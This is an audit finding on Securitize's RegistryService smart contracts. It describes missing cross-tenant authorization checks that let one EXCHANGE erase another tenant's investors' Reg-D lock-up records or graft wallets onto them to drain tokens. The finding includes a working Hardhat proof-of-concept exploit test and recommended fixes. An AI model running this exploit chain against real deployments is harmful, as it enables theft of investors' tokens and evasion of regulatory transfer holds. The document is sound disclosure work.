---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-05-29-cyfrin-securitize-full-investor-locks-v2-0-0-0
ingested_at: '2026-08-09T05:32:30Z'
protocol_category: []
published_at: '2026-05-29T00:00:00Z'
related_swc: []
severity: Medium
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-05-29-cyfrin-securitize-full-investor-locks-v2.0.md
tags:
- firm:cyfrin
- report:2026-05-29-cyfrin-securitize-full-investor-locks-v2-0
title: '`RegistryService` mutation entry points omit EXCHANGE creator-match gate,
  enabling cross-tenant investor hijacking'
vuln_class: []
---

# `RegistryService` mutation entry points omit EXCHANGE creator-match gate, enabling cross-tenant investor hijacking

_Section severity (from Solodit section header): Medium_  
_Audit firm: Cyfrin_  
_Source report: [2026-05-29-cyfrin-securitize-full-investor-locks-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-05-29-cyfrin-securitize-full-investor-locks-v2.0.md)_

---

**Description:** `RegistryService` exposes a five-tier role hierarchy (`MASTER > ISSUER > TRANSFER_AGENT > EXCHANGE > unrole'd`) where the EXCHANGE role is scoped per-investor by a `creator` field stored on each investor record. `removeInvestor` (`contracts/registry/RegistryService.sol:46`) and `removeWallet` (`contracts/registry/RegistryService.sol:176`) consult this field and refuse the call when an EXCHANGE caller is not the original creator, encoding the protocol's intent that EXCHANGE tenants are cross-tenant isolated.

The four mutation entry points that change investor state do NOT enforce the same gate:

- `updateInvestor` (`contracts/registry/RegistryService.sol:60-93`) is the bundled wrapper that forwards into `setCountry`, `addWallet` (loop), and `setAttribute` (loop, hardcoding the proof-hash argument to `""` at line 89).
- `setCountry` (`contracts/registry/RegistryService.sol:113-123`) writes `investors[_id].country` and reconciles compliance counters via `adjustInvestorCountsAfterCountryChange`.
- `setAttribute` (`contracts/registry/RegistryService.sol:133-149`) writes `attributes[_id][_attributeId]` (KYC_APPROVED / ACCREDITED / QUALIFIED / PROFESSIONAL).
- `addWallet` (`contracts/registry/RegistryService.sol:163-172`) appends a `Wallet(_id, msg.sender, msg.sender)` entry to `investorsWallets[_address]` and increments `investors[_id].walletCount`.

All four are gated only by `onlyExchangeOrAbove`. Any EXCHANGE tenant on the deployment can therefore re-country, re-attribute, graft wallets onto, and bulk-update investors created by an entirely different EXCHANGE.

Two attack consequences are worth calling out specifically. The first is destruction of US Reg-D / Rule 144 issuance lock-up records, which additionally exploits two unrelated defects on the `setCountry` -> `cleanupInvestorIssuances` path: (a) `setCountry` does not validate `_country` against the configured country set, so unconfigured strings map to compliance NONE (region `0`); (b) `cleanupInvestorIssuances` (`contracts/compliance/ComplianceServiceRegulated.sol:890-932`) re-derives `lockTime` from the investor's CURRENT country on every invocation, with per-issuance records storing only `(shares, timestamp)`. A country rewrite to an unconfigured string collapses the lockup window to the configured `nonUSLockPeriod` (typically zero), and the next `cleanupInvestorIssuances` invocation unconditionally `delete`s every record:

```solidity
// ComplianceServiceRegulated.sol:890-899
function cleanupInvestorIssuances(string memory investor) internal {
    string memory country = getRegistryService().getCountry(investor);
    uint256 region = getComplianceConfigurationService().getCountryCompliance(country);
    uint256 lockTime;
    if (region == ComplianceServiceLibrary.US) {
        lockTime = getComplianceConfigurationService().getUSLockPeriod();
    } else {
        lockTime = getComplianceConfigurationService().getNonUSLockPeriod();
    }
```

The chained exploit: an attacker EXCHANGE calls `setCountry(victimId, "Atlantis")` (any unconfigured string), then triggers any state change that runs `cleanupInvestorIssuances` (e.g., a 1-token inbound transfer from a platform wallet), and every still-locked record is deleted. The destruction is irreversible inside the in-scope contracts; no `onlyMaster` recovery function can reinsert deleted `issuancesValues` / `issuancesTimestamps` entries.

The second consequence is wallet graft, which uses the missing creator-match on `addWallet` (or `updateInvestor` as bundled wrapper) alone. An attacker EXCHANGE calls `addWallet(attackerEOA, victimId)` to bind an attacker-controlled address to the victim's investor id. Now `getInvestor(attackerEOA)` returns the victim's id; subsequent transfers from the victim's wallet to the attacker's wallet match the same-investor reallocation short-circuit at `ComplianceServiceLibrary::completeTransferCheck` (line 254) and bypass the new-investor / cap / country / whitelist gates that would otherwise reject the destination.

**Files:**

`RegistryService::updateInvestor`, `RegistryService::setCountry`, `RegistryService::setAttribute`, `RegistryService::addWallet`, `ComplianceServiceRegulated::cleanupInvestorIssuances`

**Impact:** A single attacker transaction from any EXCHANGE-role account achieves several distinct harms against any victim investor record created by any OTHER EXCHANGE on the same deployment:

- Permanent destruction of US Reg-D / Rule 144 issuance lock-up records. The deletion is unconditional and irreversible inside the in-scope contracts. The victim, after the attack, can freely transfer tokens that were under a 1-year hold; the outcome is a tradable-token windfall for the victim and regulatory exposure for the issuer.
- Wallet graft enabling token theft. An attacker-controlled address bound to the victim's investor id matches the same-investor reallocation short-circuit; the attacker drains 100% of the victim's holdings without triggering whitelist, country, or cap checks.
- Onward-transfer brick. Flipping the victim's country to a FORBIDDEN value causes their outbound transfers to fail with `DESTINATION_RESTRICTED`. Stripping their accreditation causes force-accredited offerings to reject them.
- Provenance destruction. The bundled `updateInvestor` wrapper hardcodes the proof-hash argument to the empty string at line 89, so any attribute the attacker reaches via that path has its IPFS/CID accreditation pointer overwritten and destroyed; recovery requires the off-chain document custodian to re-pin and re-submit.
- Cap-counter corruption. `setAttribute` invokes no reconciliation hook on `ComplianceServiceRegulated`, so attribute flips drift `accreditedInvestorsCount`, `usAccreditedInvestorsCount`, and `euRetailInvestorsCount[country]` against the registry's truth. Repeated re-attribution can drive the consumer subtraction `totalInvestorsCount - accreditedInvestorsCount` into Solidity 0.8 checked-arithmetic underflow.
- The attack is silent in the sense that matters most for an honest EXCHANGE-tenant watching their own investors. `setCountry` and `addWallet` emit standard events keyed by the victim's investor id, which an honest indexer is likely to read as its own bookkeeping unless it additionally cross-references the originating `msg.sender` against the investor's `creator` field. The deletion of lock-up records emits no event at all.

The attack requires holding the EXCHANGE role. EXCHANGE is a trusted role assigned by the issuer to vetted multi-tenant integration partners (an exchange, broker-dealer, or transfer-agent partner who has cleared the platform's KYC and contractual onboarding bar). The funds-at-risk wallet-graft path is bounded by the issuer's off-chain remedies (contract termination, legal action, regulatory referral) against a misbehaving EXCHANGE tenant.

**Proof of Concept:** Add the following test to `test/solace-pocs/H-1.test.ts` and run with: `npx hardhat test test/solace-pocs/H-1.test.ts`.

```typescript
import hre from 'hardhat';
import { expect } from 'chai';
import { loadFixture } from '@nomicfoundation/hardhat-toolbox/network-helpers';
import { deployDSTokenRegulated, INVESTORS } from '../utils/fixture';
import { registerInvestor } from '../utils/test-helper';
import { DSConstants } from '../../utils/globals';

const UNCONFIGURED_COUNTRY = 'Atlantis';

describe('PoC: setCountry round-trip voids Reg-D lock-up records', function () {
  it('test_PoC_setCountryRoundTripVoidsLockupRecords', async function () {
    const [
      deployer,           // signer[0] = MASTER (from TrustService.initialize)
      exchangeA,          // tenant A - registers the victim, sets country
      exchangeB,          // tenant B - attacker, different EXCHANGE
      victimWallet,       // the victim investor's wallet
      platformWallet,     // helper, used to trigger cleanup via inbound xfer
      sinkWallet,         // a separate whitelisted investor for final drain
    ] = await hre.ethers.getSigners();

    const {
      dsToken,
      registryService,
      complianceService,
      complianceConfigurationService,
      walletManager,
      trustService,
    } = await loadFixture(deployDSTokenRegulated);

    // Grant EXCHANGE to two distinct, mutually untrusted tenants. The
    // protocol's removeInvestor gate is the on-chain evidence that EXCHANGE
    // tenants are not mutually trusted.
    await trustService.connect(deployer).setRole(await exchangeA.getAddress(), DSConstants.roles.EXCHANGE);
    await trustService.connect(deployer).setRole(await exchangeB.getAddress(), DSConstants.roles.EXCHANGE);

    // US Reg-D / Rule 144 1-year hold; nonUS lockup zero (typical config).
    // The attack manifests because "Atlantis" maps to NONE region, which uses
    // nonUSLockPeriod (=0) - collapsing the 1-year window to 0.
    await complianceConfigurationService.connect(deployer).setUSLockPeriod(365 * 24 * 60 * 60);
    await complianceConfigurationService.connect(deployer).setNonUSLockPeriod(0);

    // Only "usa" is configured. "Atlantis" is intentionally NOT configured.
    await complianceConfigurationService.connect(deployer)
      .setCountryCompliance(INVESTORS.Country.USA, INVESTORS.Compliance.US);

    // Sanity: unconfigured country maps to NONE (region 0).
    expect(await complianceConfigurationService.getCountryCompliance(UNCONFIGURED_COUNTRY))
      .to.equal(INVESTORS.Compliance.NONE);

    // EXCHANGE_A registers the victim under US country. EXCHANGE_A is the
    // creator of the investor; EXCHANGE_B is a stranger.
    const victimId = INVESTORS.INVESTOR_ID.US_INVESTOR_ID;
    await registryService.connect(exchangeA).registerInvestor(victimId, '');
    await registryService.connect(exchangeA).addWallet(await victimWallet.getAddress(), victimId);
    await registryService.connect(exchangeA).setCountry(victimId, INVESTORS.Country.USA);

    // Add a platform wallet so the cleanup trigger has a valid sender that
    // bypasses the victim-side lock checks (platform-wallet-from short-circuit).
    await walletManager.connect(deployer).addPlatformWallet(await platformWallet.getAddress());

    // Issue 100 tokens to the victim. issueTokens stamps block.timestamp as
    // the issuance time, so the record sits inside the US 1-year window.
    const ISSUE_AMOUNT = 100n;
    await dsToken.connect(deployer).issueTokens(await victimWallet.getAddress(), ISSUE_AMOUNT);
    await dsToken.connect(deployer).issueTokens(await platformWallet.getAddress(), 1n);

    expect(await dsToken.balanceOf(await victimWallet.getAddress())).to.equal(ISSUE_AMOUNT);

    // Pre-state: the entire balance is under the 1-year hold, so the
    // compliance-transferable amount is 0.
    const transferableBefore = await complianceService.getComplianceTransferableTokens(
      await victimWallet.getAddress(),
      Math.floor(Date.now() / 1000) + 60,
      365 * 24 * 60 * 60,
    );
    expect(transferableBefore).to.equal(0n);

    // Sanity: an honest transfer attempt by the victim reverts with the
    // expected lock-up message - the lock-up records ARE doing their job
    // before the attack.
    await registerInvestor(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_2, await sinkWallet.getAddress(), registryService.connect(exchangeA));
    await registryService.connect(exchangeA)
      .setCountry(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_2, INVESTORS.Country.USA);
    await expect(
      dsToken.connect(victimWallet).transfer(await sinkWallet.getAddress(), 10n)
    ).to.be.revertedWith('Under lock-up');

    // ATTACK: EXCHANGE_B (NOT the creator) rewrites the victim's country to
    // an unconfigured string. The onlyExchangeOrAbove modifier passes; no
    // creator-match check fires. The string passes through unvalidated and
    // is written to investors[victimId].country.
    await registryService.connect(exchangeB).setCountry(victimId, UNCONFIGURED_COUNTRY);
    expect(await registryService.getCountry(victimId)).to.equal(UNCONFIGURED_COUNTRY);

    // Trigger cleanupInvestorIssuances on the victim via recordTransfer.
    // Platform-wallet-from bypasses the partial-lock and full-lock checks,
    // so the 1-token inbound succeeds. recordTransfer then calls
    // cleanupInvestorIssuances(investorTo), which reads the CURRENT country
    // ("Atlantis" -> NONE) and selects nonUSLockPeriod = 0 as lockTime.
    // The loop then deletes every issuance record whose timestamp satisfies
    // `timestamp <= block.timestamp - 0`, i.e. every record.
    await dsToken.connect(platformWallet).transfer(await victimWallet.getAddress(), 1n);

    // Restore the country to "usa". The setter succeeds, but the records are
    // already gone: there is no in-scope path that reinserts them.
    await registryService.connect(exchangeB).setCountry(victimId, INVESTORS.Country.USA);
    expect(await registryService.getCountry(victimId)).to.equal(INVESTORS.Country.USA);

    expect(await dsToken.balanceOf(await victimWallet.getAddress())).to.equal(ISSUE_AMOUNT + 1n);

    // BUG ASSERTION 1: compliance-transferable tokens now equals the FULL
    // balance (was 0 before the attack). This is the read-side demonstration
    // of the destroyed lock-up records.
    const transferableAfter = await complianceService.getComplianceTransferableTokens(
      await victimWallet.getAddress(),
      Math.floor(Date.now() / 1000) + 60,
      365 * 24 * 60 * 60,
    );
    expect(transferableAfter).to.equal(ISSUE_AMOUNT + 1n);

    // BUG ASSERTION 2: the victim can now actually transfer the previously
    // locked 100 tokens to a separate whitelisted US investor. Prior to the
    // attack this transfer reverted with "Under lock-up" (proven above).
    // The same call now succeeds - end-to-end proof that the regulated
    // lock-up was destroyed.
    await dsToken.connect(victimWallet).transfer(await sinkWallet.getAddress(), ISSUE_AMOUNT);
    expect(await dsToken.balanceOf(await sinkWallet.getAddress())).to.equal(ISSUE_AMOUNT);
    expect(await dsToken.balanceOf(await victimWallet.getAddress())).to.equal(1n);
  });
});
```

Test result on the unfixed codebase:

```
PoC: setCountry round-trip voids Reg-D lock-up records
  test_PoC_setCountryRoundTripVoidsLockupRecords (1251ms)
1 passing (1s)
```

The test demonstrates the bug end-to-end. Any of the three independent mitigations in the finding body breaks the test: adding a creator-match gate to `setCountry` makes the attacker's `setCountry` call revert; validating `_country` against the configured set makes `"Atlantis"` rejected; pinning the lockup window to the issuance record makes `cleanupInvestorIssuances` ignore the country rewrite.

**Recommended Mitigation:** Three independent fixes; applying all three closes every chain leg. The first is the structural fix and closes every attack consequence described above; the other two are independent defense-in-depth against the lockup-destruction-specific path.

1. Mirror the creator-match gate from `removeInvestor` onto every investor-mutation entry point in `RegistryService`. Add the following requirement to `updateInvestor`, `setCountry`, `setAttribute`, and `addWallet`:

   ```solidity
   require(
       getTrustService().getRole(msg.sender) != EXCHANGE ||
           CommonUtils.isEqualString(investors[_id].creator, msg.sender),
       "Only investor creator can update"
   );
   ```

 For `addWallet`, the creator that matters is the investor's `creator` (since the wallet is being attached to that investor record), not the wallet's prospective `creator`. For `updateInvestor`, the gate runs once at the entry point and the inner `setCountry` / `setAttribute` / `addWallet` calls are made by `RegistryService` itself, passing the check trivially. A reconciliation-style entry point `transferCreator(string _id, address newCreator)` gated `onlyMaster` plus EXCHANGE -> `creator == msg.sender` preserves operational flexibility when an EXCHANGE-tenant legitimately needs to hand off custody to another EXCHANGE.

2. Validate `_country` in `setCountry`. Reject any string that resolves to compliance NONE through `ComplianceConfigurationService::getCountryCompliance`, or document and accept the NONE-region reset path explicitly with a corresponding clear-lockups admin action. Today the function accepts arbitrary strings silently, which is the second leg of the lockup-destruction chain.

3. Snapshot the lock period (or the country) on each issuance record at issuance time, and consume the per-record value in `cleanupInvestorIssuances` and `getComplianceTransferableTokens` rather than rederiving it live. The current design re-derives the window every call from mutable registry state, so any path that mutates `getCountry(investor)` retroactively rewrites the lock window for already-issued records. Extending the storage layout with `issuancesLockPeriods[investor][i]` set inside `createIssuanceInformation` is the structural fix.

**Securitize:** Acknowledged; Exchange role is assigned by the Issuer, and it's a trusted role. We effectively want to exchange roles can operate over any investor for Registry Service entry points.
